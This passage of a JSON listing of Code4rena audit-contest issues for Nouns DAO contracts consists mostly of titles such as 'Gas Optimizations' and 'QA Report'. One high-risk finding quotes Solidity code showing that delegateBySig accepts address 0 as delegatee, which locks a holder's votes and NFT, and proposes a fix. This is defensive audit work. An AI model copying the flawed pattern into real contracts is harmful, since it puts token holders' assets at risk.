"https://github.com/code-423n4/2022-08-nounsdao-findings/issues/228", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/227", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/225", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/222", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/221", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/220", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/219", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/218", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/217", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/216", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/215", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/213", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "_setVetoer() does not use a 2 step procedure despite it being a critical operation.", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/211", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-08-nounsdao-findings", "body": "_setVetoer() does not use a 2 step procedure despite it being a critical operation."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/210", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/209", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/208", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/206", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/204", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/202", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/201", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/200", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/197", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/196", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/194", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/193", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/192", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/191", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/190", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/187", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/186", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/185", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/181", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/180", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/179", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/177", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/176", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/175", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Voters can burn large amounts of Ether by submitting votes with long reason strings", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/174", "labels": ["bug", "2 (Med Risk)", "disagree with severity"], "target": "2022-08-nounsdao-findings", "body": "Voters can burn large amounts of Ether by submitting votes with long reason strings"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/172", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/169", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/168", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/167", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/166", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/165", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/164", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/162", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/161", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/159", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/158", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "ERC721Checkpointable: delegateBySig allows the user to vote to address 0, which causes the user to permanently lose his vote and cannot transfer his NFT.", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/157", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-08-nounsdao-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/base/ERC721Checkpointable.sol#L126-L144   # Vulnerability details  ## Impact In the ERC721Checkpointable contract, when the user votes with the delegate function, the delegatee will not be address 0. ```     function delegate(address delegatee) public {         if (delegatee == address(0)) delegatee = msg.sender;         return _delegate(msg.sender, delegatee);     } ``` However, there is no such restriction in the delegateBySig function, which allows the user to vote to address 0. ```     function delegateBySig(         address delegatee,         uint256 nonce,         uint256 expiry,         uint8 v,         bytes32 r,         bytes32 s     ) public {         bytes32 domainSeparator = keccak256(             abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(name())), getChainId(), address(this))         );         bytes32 structHash = keccak256(abi.encode(DELEGATION_TYPEHASH, delegatee, nonce, expiry));         bytes32 digest = keccak256(abi.encodePacked('\\x19\\x01', domainSeparator, structHash));         address signatory = ecrecover(digest, v, r, s);         require(signatory != address(0), 'ERC721Checkpointable::delegateBySig: invalid signature');         require(nonce == nonces[signatory]++, 'ERC721Checkpointable::delegateBySig: invalid nonce');         require(block.timestamp <= expiry, 'ERC721Checkpointable::delegateBySig: signature expired');         return _delegate(signatory, delegatee);     } ``` If user A votes to address 0 in the delegateBySig function, _delegates[A] will be address 0, but the delegates function will return the address of user A and getCurrentVotes(A) will return 0. ```     function _delegate(address delegator, address delegatee) internal {         /// @notice differs from `_delegate()` in `Comp.sol` to use `delegates` override method to simulate auto-delegation         address currentDelegate = delegates(delegator);          _delegates[delegator] = delegatee; ...     function delegates(address delegator) public view returns (address) {         address current = _delegates[delegator];         return current == address(0) ? delegator : current;     } ``` Later, if user A votes to another address or transfers NFT, the _moveDelegates function will fail due to overflow, which makes user A lose votes forever and cannot transfer NFT. ```     function _moveDelegates(         address srcRep,         address dstRep,         uint96 amount     ) internal {         if (srcRep != dstRep && amount > 0) {             if (srcRep != address(0)) {                 uint32 srcRepNum = numCheckpoints[srcRep];                 uint96 srcRepOld = srcRepNum > 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0;                 uint96 srcRepNew = sub96(srcRepOld, amount, 'ERC721Checkpointable::_moveDelegates: amount underflows'); // auditor : overflow here                 _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew);             } ``` On the other hand, since the burn function also fails, this can also be used to prevent the NFT from being burned by the minter ```     function burn(uint256 nounId) public override onlyMinter {         _burn(nounId);         emit NounBurned(nounId);     } ...     function _burn(uint256 tokenId) internal virtual {         address owner = ERC721.ownerOf(tokenId);          _beforeTokenTransfer(owner, address(0), tokenId); ...     function _beforeTokenTransfer(         address from,         address to,         uint256 tokenId     ) internal override {         super._beforeTokenTransfer(from, to, tokenId);          /// @notice Differs from `_transferTokens()` to use `delegates` override method to simulate auto-delegation         _moveDelegates(delegates(from), delegates(to), 1);     } ``` ## Proof of Concept https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/base/ERC721Checkpointable.sol#L126-L144 https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/base/ERC721Checkpointable.sol#L88-L91 https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/base/ERC721Checkpointable.sol#L97-L106 https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/base/ERC721Checkpointable.sol#L197-L208 ## Tools Used None ## Recommended Mitigation Steps Consider requiring in the delegateBySig function that delegatee cannot be address 0. ```diff     function delegateBySig(         address delegatee,         uint256 nonce,         uint256 expiry,         uint8 v,         bytes32 r,         bytes32 s     ) public { + require(delegatee != address(0)); ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/154", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/153", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/152", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/151", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/149", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/146", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/145", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Execution not handling returned data", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/143", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "Execution not handling returned data"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/139", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/137", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/136", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/135", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/134", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/127", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/126", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/125", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/124", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/120", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/119", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/115", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/113", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/112", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/111", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/109", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/108", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/107", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/103", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/100", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/99", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/98", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/97", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/96", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/95", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/94", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/93", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/92", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/91", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/90", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/89", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/88", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/87", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/86", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/85", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/84", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/83", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/82", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/81", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/79", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/78", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/77", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/76", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/73", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/72", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/71", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/70", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/62", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/54", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/53", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/52", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/51", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/50", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/49", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/48", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/47", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/46", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/43", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/42", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/38", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/35", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/34", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/33", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Lack of Storage Gap in Upgradeable Contracts", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/32", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "Lack of Storage Gap in Upgradeable Contracts"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/31", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": 